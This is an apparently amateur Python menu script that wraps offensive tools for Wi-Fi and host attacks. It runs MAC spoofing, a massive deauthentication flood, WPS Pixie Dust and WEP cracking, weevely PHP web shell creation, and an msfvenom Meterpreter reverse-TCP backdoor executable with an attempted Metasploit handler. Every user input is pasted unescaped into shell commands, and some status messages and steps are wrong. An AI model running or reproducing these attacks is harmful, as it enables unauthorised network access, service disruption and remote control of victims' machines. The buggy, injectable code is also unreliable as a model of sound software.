
import sys
import os
import time

interface = sys.argv[1]
os.system("clear")
while True:
	print("\n1 - Change mac addrese\n")
	print("2 - Change interfaces mdo to monnitor mode\n")
	print("3 - Show nearby Wi-Fis\n")
	print("4 - Capture data from specific wi-fi\n")
	print("5 - Kick device from Wi-Fi\n")
	print("6 - Show Wi-Fis which have enabled WPS\n")
	print("7 - Pixiedust attack wo WPS vurnability\n")
	print("8 - Collect data for WEP attack\n")
	print("9 - Crack collected data to get password WEP\n")
	print("10 - Create weevly shell\n")
	print("11 - Connect to weevly shell\n")
	print("12 - Create msfvenom payload\n")
	print("13 - Start metasploit for msfvenom payload\n")
	print("0 - Exit")
	s = input("Choise: ")
	if 0 == int(s):
		break
	if 1 == int(s):
		new_mac_addres = input("New mac addres (example: 00:11:22:33:44:55 : ")
		os.system("ifconfig "+ interface +" down")
		os.system("ifconfig "+ interface +" hw ether "+new_mac_addres)
		os.system("ifconfig "+ interface +" up")
		print("Interface succesfully set to monitor mode")
	if 2 == int(s):
		os.system("ifconfig "+ interface +" down")
		os.system("iwconfig "+ interface +" mode monnitor")
		os.system("ifconfig "+ interface +" up")
		print("Interface succesfully set to monitor mode")
	
	elif 3 == int(s):
		os.system("airodump-ng "+ interface)
	elif 4 == int(s):
		k = input("BSSID: ")
		c = input("Channel: ")
		os.system("airodump-ng --bssid "+ k +" --channel "+ c +" --write captur "+ interface)
	elif 5 == int(s):
		bssid_deauth = input("BSSID: ")
		target_deauth = input("MAC addrese: ")
		os.system("aireplay-ng --deauth 100000000 -a "+ bssid_deauth +" -c " +target_deauth +" " + interface)
	elif 6 == int(s):
		os.system("wash -i "+ interface)
	elif 7 == int(s):
		bssid_wps = input("BSSID: ")
		channel_wps = input("Channel: ")
		os.system("reaver -i "+ interface +" -b "+ bssid_wps +" -c "+ channel_wps +" -vvv -K 1 -f")
	elif 8 == int(s):
		bssid_wep = input("BSSID: ")
		channel_wep = input("Channel: ")
		name_capture = input("Name of captured data: ")
		t_end = time.time() + 30
		while time.time() < t_end:
			os.system("airodump-ng --bssid "+ bssid_wep +" --channel "+ channel_wep +" --write "+ name_capture +" "+ interface)
	elif 9 == int(s):
		captured_file=input("Name of captured data: ")
		os.system("aircrack-ng "+ captured_file +"-01.cap")
	elif 10 == int(s):
		weevely_password = input("Password for shell: ")
		os.system("weevely generate "+ weevely_password +" shell.php")
	elif 11 == int(s):
		weevely_url = input("URL for shell: ")
		weevely_password_shell = input("Password for shell: ")
		os.system("weevely "+ weevely_url +" "+ weevely_password_shell +"")
	elif 12 == int(s):
		msfvenom_ip = input("Host ip: ")
		msfvenom_port = input("Port: ")
		os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost="+ msfvenom_ip +" lport="+ msfvenom_port +" -e cmd/powershell_base64 -i 5 -f exe > back.exe")
	elif 13 == int(s):
		msfvenom_ip_metasploit = input("Host ip: ")
		msfvenom_port_metasploit = input("Port: ")
		os.system("msfconsole")
		os.system("use exploit/multi/handler")
		
		
		
